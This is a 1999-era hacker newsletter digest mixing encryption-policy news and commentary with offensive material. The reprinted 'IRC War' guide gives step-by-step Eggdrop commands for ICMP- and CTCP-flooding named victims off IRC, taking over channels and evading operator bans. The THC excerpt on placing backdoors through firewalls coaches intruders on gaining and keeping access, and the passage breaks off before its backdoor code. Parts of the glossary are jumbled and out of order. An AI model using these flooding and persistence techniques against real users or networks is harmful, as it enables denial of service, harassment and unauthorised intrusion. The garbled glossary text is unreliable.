   SYNOPSIS (READ THIS)
   --------------------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... &lt;g>

 00.1 CONTACT INFORMATION AND MAIL DROP
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


     Wahoo, we now have a mail-drop, if you are outside of the U.S.A or
    Canada / North America (hell even if you are inside ..) and wish to
    send printed matter like newspaper clippings a subscription to your
    cool foreign hacking zine or photos, small non-explosive packages
    or sensitive information etc etc well, now you can. (w00t) please
    no more inflatable sheep or plastic dog droppings, or fake vomit
    thanks.

    Send all goodies to:

	    HWA NEWS
	    P.O BOX 44118
	    370 MAIN ST. NORTH
	    BRAMPTON, ONTARIO
	    CANADA
	    L6V 4H5

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. &lt;g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.
    
    
    Stuff you can email:
    
    - Prank phone calls in .ram or .mp* format
    - Fone tones and security announcements from PBX's etc
    - fun shit you sampled off yer scanner (relevant stuff only like #2600 meeting activities)
    - reserved for one smiley face ->        :-)            <-
    - PHACV lists of files that you have or phac cd's you own (we have a burner, *g*)
    - burns of phac cds (email first to make sure we don't already have em)
    - Any and all telephone sounds/tones/beeps/trunk drops/line tests/etc in .ram etc format or .mp*
    

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it &lt;BeG>

      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)

             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like

    du0d   - a small furry animal that scurries over keyboards causing people to type
             weird crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala

            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me

      They aren't giving up. The Cyberspace Electronic
      Security Act is currently being drafted by the Clinton
      administration. In this latest bill, the administration
      proposes that law enforcement agents have access to
      decryption keys held by recovery agents. The proposed
      law also allows the government to obtain search
      warrants to find decryption keys if they are not held by
      recovery agents. (Maybe the feeling is that if they keep
      submitting new bills, one of them, eventually, will get
      through. Unfortunately they are probably correct.)

     Bill reopens encryption access debate

     BY DOUG BROWN (dbrown@fcw.com)
     AND L. SCOTT TILLETT (scott_tillett@fcw.com)

     Renewing efforts to allow law enforcement agencies to access and read
     suspected criminals' encrypted electronic files, the Clinton administration has
     drafted a bill that would give those agencies access to the electronic "keys"
     held by third parties.

     The Cyberspace Electronic Security Act, the drafting of which is being led by
     the Office and Management and Budget and the Justice Department, "updates
     law enforcement and privacy rules for our emerging world of widespread
     cryptography," according to an analysis accompanying the bill obtained by
     Federal Computer Week.

     Encryption technology, according to the draft, is "an important tool for
     protecting the privacy of legitimate communications and stored data" but also
     has been used "to facilitate and hide unlawful activity by terrorists, drug
     traffickers, child pornographers and other criminals." The new bill seeks to
     uncover that activity by allowing law enforcement officials to obtain the keys
     needed to decrypt messages by applying for search warrants or court orders,
     much as they might do to uncover other evidence.

     The administration is concerned about the use of encryption technology
     because advances in recent years have made it extremely difficult for law
     enforcement officials to crack a code once they have intercepted a message.

     The draft bill is the Clinton administration's latest effort to push for legislation
     that would make it easier for law enforcement agencies to intercept messages
     or data that they think would be helpful in criminal investigations.

     In 1993 the administration introduced the Clipper Chip, a hardware-based
     encryption device designed to protect private communications but that would
     provide a "backdoor" for law enforcement officials to decrypt necessary data.
     The Clipper effort died after privacy groups and industry warned that law
     enforcement agencies could abuse the power.

     "All this is the Clipper Chip revisited in a different flavor but not as effective,"
     said Michael Anderson, president of computer forensics firm New
     Technologies Inc.

     The administration also has blocked the export of certain advanced encryption
     technology that would defeat efforts to conduct digital wiretaps as part of its
     fight against international drug cartels and terrorists. But the software industry
     continues to fight for the lifting of export restrictions.

     In the latest bill, the administration proposes that law enforcement agents have
     access - under limited circumstances - to decryption keys held by recovery
     agents, which are third-party warehouses of decryption keys that "unlock"
     complex codes that mask the readable form of the data. The proposed law
     also allows the government to obtain search warrants to find decryption keys
     if they are not held by recovery agents.

     The proposed bill would provide new protections for lawful users of
     encryption. Currently, according to a summary of the bill that is part of a
     proposed letter to House Speaker Dennis Hastert (R-Ill.), there are few laws
     guiding how recovery agents treat the decryption keys they store. The bill
     would prohibit recovery agents from disclosing the keys or from using the
     keys to decrypt data except under certain circumstances, such as when a
     lawful heir of a deceased person wants decryption keys to the deceased's
     locked information.

     The draft bill also prohibits recovery agents from selling or revealing in any
     way their customer lists to other parties.

     The new protections, however, are not strong enough to avoid the erosion of
     privacy rights, said David Sobel, general counsel for the Electronic Privacy
     Information Center, an advocacy group based in Washington, D.C. "It is not a
     pro-encryption proposal," he said. "The bottom line is: This is legislation that
     would increase law enforcement's ability to access encrypted data."

     It also would serve to lay the legal groundwork for eventually outlawing
     encryption that does not have decryption keys available to law enforcement,
     Sobel said. "They could say, 'We have established legal procedures in place,
     they have been used in several cases. Now our problem is not everybody is
     using encryption that provides us with...access,' " he said.

     Barbara Simons, president of the California-based Association for Computing
     Machinery, said the proposed bill bodes poorly for citizens' privacy. "Our
     lives are moving more and more online," she said. "There's always the risk that
     some future government or administration might compromise the rights and
     freedoms we enjoy today and take advantage of this technology."

     The proposed bill was not a surprise, she said, because FBI Director Louis
     Freeh "has been pushing to have access keys for a long time."

     Fred Smith, an attorney in Santa Fe, N.M., who works as a special
     prosecutor in computer cases, said he does not believe the administration's
     motives are nefarious.

     "I really believe that there's a serious and good faith concern about what we're
     going to do if encryption takes off the way it appears to be taking off at the
     moment," he said.

     A spokesman for DOJ described the proposal as "pending" and declined to
     comment on it.

     One Capitol Hill staffer had some concerns. "I think they are really trying to
     hobble how people use encryption," said Ellen Stroud, spokeswoman for
     Rep. Bob Goodlatte (R-Va.), sponsor of the Security and Freedom through
     Encryption Act, which would relax controls on the export of encryption and
     prohibit the government from requiring a backdoor into people's e-mail and
     computer files.

     Stroud said law enforcement officials examining electronic files as they pursue
     criminals in cyberspace could accidentally modify or destroy a company's
     legitimate files. "[The proposal] doesn't provide the needed protection for
     companies using encryption," she said. "You're putting yourself at greater
     liability [if you use a third-party firm to keep encryption keys.] It's easier for
     somebody to search you."

     Stroud also said owners of information searched during a criminal investigation
     will not necessarily know what information law enforcement officials have
     been examining because the draft bill would allow law enforcement officials in
     some cases to delay issuing notice of the search warrant. 

     "If you want information from me, come to me and get it," Stroud said. "Why
     go to somewhere else? Why go to my neighbor? If you have a problem, hit it
     straight on."

04.0 The lost art of IRC warfare using eggdrop bots
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     I found this while looking for a country script for a certain bot on a certain 
     channel and found it pretty informative...so its here for you to peruse and
     perhaps learn a thing or two from the 'other' side of IRC. - Ed
     
     
                                                 IRC WAR

                                  Fighting with, and against, the Eggdrop Bot!
                                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
                                                By Stormking


     The properly configured Eggdrop bot is one of the most powerful IRC war machines, able to flood,
     icmp, nuke, and easily takeover channels. It is also damn near impossible to kill! On this page 
     I will try to teach you a few of the tricks of configuring and using the Eggdrop Warbot.
     
     By itself Eggdrop is little more than a tough irc client. The heart of the warbot is in the various 
     tcl scripts designed to wreak havoc on IRC! I'll tell you what they are, where to get them, and how to
     set them up for maximum damage. First, lets make sure yer bot's protection is set up properly.
     
     Eggdrop flood protection is set in the config file, way down in the "###MORE ADVANCED STUFF###" section.
     Heres an example from a 1.1.4 bot:
     
     # how many msgs in how many seconds from the same host constitutes a flood? set flood-msg 5:60 
     # how many public msgs in how many seconds? set flood-chan 10:60 
     # how many joins/nick changes in how many seconds? set flood-join 5:60 
     # how many CTCPs in how many seconds? set flood-ctcp 3:60
     
     You can change these to yer liking but I find that the defaults work just fine in most cases. Some bot 
     masters run an extra tcl for protection such as ctcpprot but I've rarely had a bot flud off with the 
     defaults. If you feel you need extra protection, its there.
     
                                                    Fighting With Eggdrop
     
     So you got a new bot and you want to be a badass? Well, its easy enough to do. After you have yer bot's 
     protection squared away, you'll need a few tcl scripts to help you on yer way. I don't have the server 
     space to offer all the available war tcls but you can get most any of them at ftp://ftp.sodre.net/pub/eggdrop/
     in the appropriate scripts section for yer bot version. Here's a list of some of my favorites:
     
        - icmp tcl Fabulous, if yer shell supports ping 
        - Chantoolz Has its own floods too. For 1.0x 
        - takeover.tcl Self explanatory. For 1.0x 
        - massmode1.1a.tcl 1.1x takeover script 
        - mjoin.tcl A mass join script for botnets 
        - flud501e.tcl 1.0x fludnet scripts. Rox their asses! 
        - flud501f-oc.tcl 501e modified for 1.1x bots 
        - Wardrop.tcl Most everything combined into one script! 
        
     
     There are also a few advanced Unix war programs like "botnuke", "ssping", and "pepsi" but they require root 
     access so almost noone can use them. If you have root access, you likely don't need me to tell you how to play
     war on Unix! The same goes for the fabled "spoofers", if you have them, you know how to use them.
     
     OK, now that we have them, how do we use them? Well, most have their own help files. Use them. Anytime you are
     planning on loading a script you should always open it in an editor to see if there is anything you need to set
     before loading it. Now's a good time to look the script over for the basic commands, and the help  
     commands! For example, the help file in takeover.tcl is accessed with the command ".thelp". This is a typical usage.
     Sometimes there are settings for which user flag will be required to use the tcl. Most default to +m but you can 
     change that. My recommendation is to leave it as +m or even +n. Don't let all yer users access your bot's war stuff
     unless you want problems with opers.
     
     Let's talk a little about icmp.tcl. This script rox, if you can use it. Unfortunately most shells don't allow ping
     or allow only very limited pinging. Its easy to find out if you got lucky.... Just load the script, no editing needed 
     for the test. In dcc type ".set icmp 1". Now get someone's dns addy (the numeric one, do "/dns nick" in mIRC) and 
     type ".icmp addy", putting the dns addy instead of the word "addy" of course.... Your bot will do one of several 
     things. Most likely it will say "Sorry, this shell does not support ping". If it does, yer s.o.l., unload the script. 
     It might, however, say "now icmp flooding". If it floods, watch yer victim (or use yer own dns for the test) and see if
     he poofs. If he drops off within a few minutes you are one of the lucky ones! If not, your ping is limited to a useless
     level. The help file for icmp.tcl is "icmp".
     
     Another kewl script is mjoin.tcl. Its a botnet mass join/part script. Its usage is real simple, just load it and type 
     ".mjoin #channel". Every bot on yer net which is running this script will join that channel. Use ".mpart #channel" to 
     get them out. This script can be loads of fun but use it carefully as some people don't care for their bots being 
     jerked into strange channels. Those people, of course, shouldn't run this tcl but some do......
     
     The king of the Eggdrop war scripts is flud.tcl, available in various versions. The ones I prefer are available above.
     Use 501e for 1.0x bots and 501f for 1.1x. 501e comes complete with 2 versions, a standard -oc version and a +oc version. 
     The +oc (stands for oper-check) will check the victim before fludding and abort fluds on opers, a damn good idea!
     
     There is a bit more to this tcl, both in setup and use, than most of the others. To get started open the tcl in any 
     editor EXCEPT PICO (pico doesn't like long lines). You will see these settings at the top:
     
     # set flag1 "e" ;# Flag suggested for fludflag. 
     set fludword "flud" ;# Word to use for fluding 
     set fludflag "m" ;# Flag required for fluding. 
     set fludver "501-e" ;# Flud Version. DON'T Change(I'll kill you if you do)! 
     set fludmax 10 ;# Max times to flud. 
     set fluddef 5 ;# Default flud times. 
     set fludnap45 ;# Leave this at 45 to keep the net in synch! 
     set fludnet "EFnet" ;# Net you are on. 
     set fludact 1 ;# Flud on or off? (0/1) 
     set ircnick "" ;# Define your IRC nickname here. EXTREME PROTECTION! 
     set fludnick 0 ;# Change to 1 to Enable Nick Changes during fludz. 
     
     The first one, #set flag1 "e", you have to uncomment if you want to use it. It gives users a seperate flag if they are
     allowed to flud. I never use this, I just leave the fludflag at "m", allowing any master to flud. The only settings you
     might need to change here are the fludnet, ircnick, and fludnick. 
     
     Fludnet, obviously, should be set to the network yer bot is on. Ircnick allows 1.0x bots to have a different nick on the
     botnet and on irc, a good idea in my opinion. 1.1x allows you to set "botnet nick" in the config file so its not needed here.
     Fludnick is an interesting feature, very useful but somewhat annoying. It changes yer bot's nick during fluds to a random 
     nick, such as SJYT233, then changes it back again after the flud. This can save you from k-lines when the victim sends his log 
     to an oper but can be a bitch in a busy channel. I always set fludnick 1. All my bots flud and I have very few k-lines. Its up 
     to you!
     
     OK, once you have these things set its time to learn how to use flud. The help file for flud.tcl is ".fludhelp". You will need 
     it. There are many types of fluds available, each useful in certain situations.
     
     The basic syntax for fluds is ".flud/ nick /# of times/ type of flud". In other words, ".flud butthead 10 15" would flud 
     butthead 10 times with a type 15 flud, a "Boom" echo flud. Always use 10 for the number of lines as most fludbots are set for a
     maximum of 10. If my victim is a standard mIRC client I like to start with the Boom flud. If there are above 30 fludbots available
     he will usually drop. If he doesn't drop, he may be running an advanced mIRC script and be basically un-fludable. Against bots I
     use a "4" or clientinfo flud. Sometimes it works. Another kewl flud is the "22" or privmsg flud. This one opens a bunch of little 
     chat windows on yer victims screen. Not very effective but annoying as hell! Experiment, find yer own favorites.
     
     A few other useful commands are ".fludbots", which tells you how many bots will flud, and ".last" which tells who made the last
     flud. Set yer console to +5 to see flud results and progress. Always remember the main rule of fludding, do a /whois on yer victim 
     before fludding. DO NOT EVER flud irc operators. To do so risks not only yer own bots but all fludbots on the net. Most botnets 
     will kick you off for fludding an oper. Remember this. You have been warned.
     
                                                   Fighting Against Eggdrop
     
     Since Eggdrops are UNIX processes they are invincible to standard nuking and such things as will easily kill a Windoze client. A
     strong icmp, such as from a T3, will kill a bot but thats about it. This assumes, of course, that yer bot is on a solid shell 
     (Win-Eggs are NOT included). I've also had limited success with an old DOS based proggie called Flash. Most Eggdrops don't blink at
     this but a few will drop. Its worth a try if you need to kill an Eggdrop.
     
     If you have a good fludnet behind you (say 50 or more fludbots) you can sometimes drop an Egg with a standard flud. I find that 
     clientinfo fluds (usually flud type 4) work best against Eggdrops. Again, most won't blink but a few will fall. You can also try a
     good nuker set for non-standard protocols like "host unreachable". If these things don't work yer likely stuck with waiting and 
     hoping the bot's shell goes down so you can jump in the channel and quickly kill the other users, grabbing ops before the bot returns.
     
                                                          In Conclusion
     
     Many people nowadays say things like "IRC war is lame" or "the days of IRC war are over". Well, lame it may be, but dead it certainly
     isn't. I am a firm believer in peace on Earth, and on IRC, but I also believe that peace is best maintained, in both cases, through 
     superior firepower.

      The State of Crypto Policy Today: If you have
                                        nothing to hide...


      By: Brian Oblivion

      The World remains forever changed by the promise of
      international telecommunications. For the past 3 decades
      we have enjoyed an ever growing communications
      explosion providing a mechanism for the free flow of
      information internationally. With early communications
      systems, Governments could easily setup listening posts
      on international links before exiting the country via
      undersea cable or satellite uplinks. Prior to the mid-1980's
      the resources to protect communications via cryptography
      were cost prohibitive and physically constraining. 
      
      Privacy is power, therefore it must be regulated.
      
      Today, the proliferation of high-performance, low-power,
      low-cost micro-processors have opened the door to build
      cryptographic protection into all communication systems.
      This would render existing governmental listening outposts
      obsolete. We know this is true, due to the scrambling at
      hand on curtailing the proliferation of strong encryption
      systems and software. The intelligence communities have
      noticed a sharp increase in encrypted traffic across the
      communications networks of the world. This originally
      prompted the US (United States) to advertise the use of
      Key Escrow/Recovery encryption, where the keys used to
      protect information would be stored by a trusted third
      party. Later, a key could "lawfully" be obtained to decrypt
      stored files or communications in real-time once protected
      by that key. 
      
      International and domestic opposition to Key
      escrow/recovery systems has seemed to triumph in
      Europe and most of the world. The OECD (Organization for
      Economic Cooperation and Development), a Paris-based
      international body of 29 countries, resisted lobbying by
      the US Department of Justice, FBI and NSA to endorse
      key escrow/recovery systems. The European Union is a
      staunch opponent to Key Escrow regimes and is presently
      removing inter-union restrictions on encryption products,
      leading the way for other countries to adopt privacy
      focused strategies. 
      
      In addition to OECD, The Wassenaar Arrangement, a 32
      country body, sets export controls for conventional
      weapons and sensitive dual-use goods and technologies.
      The US successfully lobbies this organization, and uses it
      to assert its crypto policy on an international scale. The
      bulk of the restrictions on dual-use goods and
      technologies are uncannily similar to those which are
      promulgated by the United States. Recently the
      Arrangement increased export restrictions on encryption
      products with 64-bit or greater key sizes. In light of this
      new restriction, many countries have voiced their
      opposition to this change in policy and plan on not
      adopting the new restriction. 
      
      While no country is bound by any of these agreements,
      they are encouraged to adopt the guidelines set forth by
      these bodies. When countries fail to adequately interpret
      the guidelines to be in line with US interpretation,
      diplomatic consultation results. Recently Janet Reno, US
      Attorney General, wrote the chancellor of Germany's
      Federal Secretary of Justice to restrict the distribution of
      "public domain" encryption products. It can be surmised
      that the position of the US is to petition others to remove
      all public domain encryption software from distribution
      servers currently on the Internet. 
      
      As a direct result of this international collaboration of
      encryption policy, the US has recently published its policy
      on encryption usage, as House Resolution HR-2616. The
      policy is mostly well founded, and while still not relaxing
      encryption export controls on encryption bit lengths over
      64-bit, it still allows US Citizens to use any encryption
      they should choose without mandating key escrow
      mechanisms. 
      
      " ...it shall be lawful for any person within any State and
      for any United States person to use any encryption
      product, regardless of encryption algorithm selected,
      encryption bit length chosen, or implementation technique
      or medium used." 
      
      Hopefully the public at large will act responsibly with
      encryption technology. As with the current view of
      firearms, this freedom is likely to be short lived. 
      
      Nowhere in the document does it discuss the ramifications
      of keeping keys in tamper-responsive hardware. Nor does
      it discuss the ramifications of reverse-engineering
      cryptographic implementations. It can be read that as
      long as you do not decrypt someone's communications or
      medium without their consent you are exempt from the
      laws referenced therein. There is also exclusion for
      encryption products and services which are used solely for
      access control, digital signatures, authentication or similar
      purposes. This does allow the decryption of passwords,
      and the like for security auditing and other such practices.
      
      However, Government encryption use is called to use
      escrowed cryptography, as well as are government
      contractors engaged in contract work for the government.
      This is actually more of a blessing than an impediment,
      where the government at least will have to continue to
      operate responsibly. 
      
      The provision still exists where all investigations thwarted
      by the use of encryption will be recorded by the Attorney
      General, and maintained in classified form. The results of
      these findings will undoubtedly sway future addendums to
      the current policy toward encryption. 
      
      The Security and Freedom through Encryption Act (SAFE),
      once a very liberating legislative initiative, has since come
      under attack by law enforcement and the intelligence
      community. The original goal of SAFE was to relax all
      exportation restrictions regardless of encryption key
      length. However, the restrictions are now back in the Act,
      with exceptions for key lengths of 64 bits or less. All other
      encryption software must first be subject to governmental
      review before permission can be granted for export. 
      
      The export restriction on key length is to be set by a
      newly formed Encryption Export Advisory board, which
      shall be comprised of a chairman under the Secretary of
      Commerce for Export Administration. Seven other
      individuals appointed by the President representative of
      the NSA, CIA, the Office of the President, and four from
      the private sector who have expertise in the information
      security field. The board is to report to the president
      every 30 days on what encryption technology is suitable
      for export. The president can still override any
      recommendation they may come up with. 
      
      The SAFE act continues prohibition on Federal or State
      governmental mandated key escrow systems. A provision
      stating that encrypted communications alone is not
      "probable cause" to obtain a search warrant to request
      the cleartext of said communications is a big win for
      privacy advocates. It blocks a blanket probable cause to
      eavesdrom on all communications, once the majority of
      traffic is encrypted. 
      
      There are some extra penalties for using encryption to
      hide "criminal" activity. One can realize that this may
      become immaterial once it becomes the exception to not
      encrypt your communications channels or your storage
      mediums. Especially as the trend for hidden and low level
      crypto systems is on the rise. 
      
      Another disturbing attribute is the mandatory, one-time
      15-day technical review of your algorithms/equipment with
      the Secretary of Commerce. There are some specific
      restrictions for equipment which can be used for military
      or intelligence end use, or which may be used for terrorist
      organizations. It would seem that the definition of what
      can be construed as such equipment can be quite broad
      and applied to almost all encryption technologies. 
      
      As with the US Crypto Policy house resolution, a
      committee to research buggered prosecutions due to the
      employment of encryption technologies, is to be
      established. The database will be 'classified', and
      accessible by appropriate law enforcement agencies. The
      results of this investigation will undoubted be used as a
      case to repeal the prohibition of mandated key escrow
      systems or a change in export policies. 
      
      This bill has been introduced into the senate as the
      PROTECT Act of 1999, S798 IS. 
      
      Money is power, therefore we are Taxed.
      
      HR 2617, "To amend the Internal Revenue Code of 1986 to
      allow a tax credit for development costs of encryption
      products with plaintext capability without the user's
      knowledge." 
      
      There is a move in Congress (HR 2617) to alter the
      existing tax law to allow corporations which develop and
      implement encryption technologies a tax deduction. This
      tax deduction is not a reward for a high level of security,
      but rather, if the system has the capability of escrowing
      keys used in the system. In order for this strategy to
      work, taxes would continue to rise, thereby aiding those
      who conform to . The legitimate basis for this Resolution
      may be to stimulate development to support the US
      Governments own request for Key escrowed/recovery
      systems for its use. 
      
      Privacy is privilege, therefore communications are
      supervised.
      
      To further understand the commitment the US
      Government has on domestic intelligence dominance, the
      Communications Assistance for Law Enforcement ACT
      (CALEA), which will provide law enforcement agencies
      cleartext or clearvoice in near real-time without the
      endusers knowledge, is clearing hurdle after hurdle. CALEA
      was once opposed by the telecommunications industry,
      but now that the Federal Government has removed the
      monetary burden, from industry to the government, almost
      all dissension has been quelled. 
      
      Performing such a wiretap is permitted only by a court
      order. But with all new technology, remote capabilities and
      ease of use will undoubtedly provide some risk
      unauthorized monitoring of otherwise private
      communications. Another possibility is during emergency
      war powers or some other crisis, the inconvenience of
      obtaining a court order to perform a wiretap could be
      waived by a predatorial government, resulting in broad,
      undetectable eavesdropping capabilities. To thwart such
      activity, personal encryption technology will still be
      required to circumvent the buggered, state sponsored
      systems. 
      
      Knowledge is power, therefore it must be controlled.
      
      In the US, The National Conference of Commissioners for
      Uniform State Laws (NCCUSL) has approved and adopted
      the Uniform Computer Information Transactions Act
      (UCITA). While this document has been criticized publicly
      by Attorney Generals from various states, some of the
      flaws are detrimental to security applications and condone
      poor programming practices. 
      
      Even after cryptographic algorithms are verified to be
      relatively secure at a certain point in time, the
      implementation of the overall system utilizing the algorithm
      can be flawed. One must push software's bounds of
      normal operations to flesh out any potentially revealing
      error conditions. Using software outside of it's intended
      use is considered a breach of contract, and prohibited by
      the UCITA. 
      
      There are also stipulations for publicly posting criticizing
      statements against faulty software. As security groups
      have proven, many times security holes are only
      addressed once widebanded to a software company's
      peers and customers. Cryptographic implementations must
      be allowed public scrutiny and analysis by ones peers. An
     implementation steeped in secrecy is usually flawed and
      obfuscated to prevent the revelation of such flaws.
      Removing the service of independent analysis will degrade
      the overall state of security in the industry, leaving the
      holes in the hands of manditory federal reviewers. 

      As we move into the next millennium the topic of
      encryption will continue to strike up heated debate
      between Intelligence Communities and liberty advocates.
      The world is mostly comfortable to give up its privacy for
      a little security. This is usually done in comfortable
      political climates. Should that climate ever change, we will
      have given Government the keys to our lives, and the
      ability to keep its interests above and beyond the will its
      subjects. The cryptographic debate boils down to: the
      ability to communicate without the fear of government
      intrusion, or the possibility for all of your communications
      to be intercepted by an uninvited third party. If you have
      nothing to hide...

07.0 Using a backdoor in a firewalled system

     -------------------------[  Placing Backdoors Through Firewalls
     
     
     --------[  van Hauser / THC &lt;vh@reptile.rug.ac.be>
     
     
     
     
     ----[  Introduction
     
     
     This article describes possible backdoors through different firewall
     architectures. However, the material can also be applied to other
     environments to describe how hackers (you?) cover their access to a system.
     
     Hackers often want to retain access to systems they have penetrated
     even in the face of obstacles such as new firewalls and patched
     vulnerabilities.  To accomplish this the attackers must install a
     backdoor which a) does it's job and b) is not easily detectable. The
     kind of backdoor needed depends on the firewall architecture used.
     
     As a gimmick and proof-of-concept, a nice backdoor for any kind of
     intrusion is included, so have fun.
     
     
     
     
     ----[  Firewall Architectures
     
     
     There are two basic firewall architectures and each has an enhanced version.
     
     Packet Filters:
             This is a host or router which checks each packet against an
             allow/deny ruletable before routing it through the correct
             interface. There are very simple ones which can only filter
             from the origin host, destination host and destination port, as
             well as good ones which can also decide based on incoming interface,
             source port, day/time and some tcp or ip flags.
             This could be a simple router, f.e. any Cisco, or a Linux
             machine with firewalling activated (ipfwadm).
     
     Stateful Filters: This is the enhanced version of a packet filter. It
             still does the same checking against a rule table and only
             routes if permitted, but it also keeps track of the state
             information such as TCP sequence numbers.  Some pay attention
             to application protocols which allows tricks such as only
             opening ports to the interiour network for ftp-data channels
             which were specified in a permitted ftp session.  These
             filters can (more or less) get UDP packets (f.e. for DNS and
             RPC) securely through the firewall. (Thats because UDP is a
     	stateless protocol. And it's more difficult for RPC services.)
             This could be a great OpenBSD machine with the ip-filter software,
             a Cisco Pix, Watchguard, or the (in)famous Checkpoint FW-1.
     
     Proxies / Circuit Level Gateways: A proxy as a firewall host is simply
             any server which has no routing activated and instead has
             proxy software installed.  Examples of proxy servers which may
             be used are squid for WWW, a sendmail relay configuration
             and/or just a sockd.
     
     Application Gateways:
             This is the enhanced version of a proxy. Like a proxy, for every
             application which should get through the firewall a software must
             be installed and running to proxy it. However, the application
             gateway is smart and checks every request and answer, f.e. that
             an outgoing ftp only may download data but not upload any, and that
             the data has got no virus, no buffer overflows are generated in
             answers etc. One can argue that squid is an application
             gateway, because it does many sanity checks and let you filter
             stuff but it was not programmed for the installation in a secure
             environment and still has/had security bugs.
             A good example for a freeware kit for this kind is the TIS firewall
             toolkit (fwtk).
     
     Most firewalls that vendors sell on the market are hybrid firwalls,
     which means they've got more than just one type implemented; for
     example the IBM Firewall is a simple packet filter with socks and a
     few proxies.  I won't discuss which firewall product is the best,
     because this is not a how-to-by-a-firewall paper, but I will say this:
     application gateways are by far the most secure firewalls,
     although money, speed, special protocols, open network policies,
     stupidity, marketing hype and bad management might rule them out.
     
     
     
     
     ----[  Getting in
     
     Before we talk about what backdoors are the best for which firewall
     architecture we should shed a light on how to get through a firewall
     the first time. Note that getting through a firewall is not a plug-n-play
     thing for script-kiddies, this has to be carefully planned and done.
     
     The four main possibilities:
     
     Insider: 
             There's someone inside the company (you, girlfriend, chummer)
             who installs the backdoor. This is the easiest way of course.
     
     Vulnerable Services: 
             Nearly all networks offer some kind of services,
             such as incoming email, WWW, or DNS. These may be on the
             firewall host itself, a host in the DMZ (here: the zone in front
     	of the firewall, often not protected by a firewall) or on an internal
             machine. If an attacker can find a hole in one of those services,
             he's got good chances to get in.  You'd laugh if you saw how many
             "firewalls" run sendmail for mail relaying ...
     
     Vulnerable External Server: 
             People behind a firewall sometimes work on
             external machines.  If an attacker can hack these, he can
             cause serious mischief such as the many X attacks if the
             victim uses it via an X-relay or sshd.  The attacker could
             also
      send fake ftp answers
             to overflow a buffer in the ftp client software, replace a gif
             picture on a web server with one which crashs netscape and
             executes a command (I never checked if this actually works, it
             crashs, yeah, but I didn't look through this if this is really
             an exploitable overflow).  There are many possibilities with
             this but it needs some knowledge about the company. However,
             an external web server of the company is usually a good start.
             Some firewalls are configured to allow incoming telnet from
             some machines, so anyone can sniff these and get it. This is
             particulary true for the US, where academic environments and
             industry/military work close together.
     
     Hijacking Connections:
             Many companies think that if they allow incoming telnet with
             some kind of secure authentication like SecureID (secure algo?, he)
             they are safe. Anyone can hijack these after the authentication and
             get in ... Another way of using hijacked connections is to modify
             replies in the protocol implementation to generate a buffer
             overflow (f.e. with X).
     
     Trojans:
             Many things can be done with a trojan horse.
             This could be a gzip file which generates a buffer overflow
             (well, needs an old gzip to be installed), a tar file which
             tampers f.e. ~/.logout to execute something, or an executable
             or source code which was modified to get the hacker in somehow.
             To get someone running this, mail spoofing could be used or
             replacing originals on an external server which internal employees
             access to update their software regulary (ftp xfer files and www
             logs can be checked to get to know which files these are).
     
     
     
     
     ----[  Placing the Backdoors
     
     An intelligent hacker will not try to put the backdoors on machines in
     the firewall segment, because these machines are usually monitored and
     checked regulary. It's the internal machines which are usually unprotected
     and without much administration and security checks.
     
     I will now talk about some ideas of backdoors which could be implemented.
     Note that programs which will/would run on an stateful filter will of course
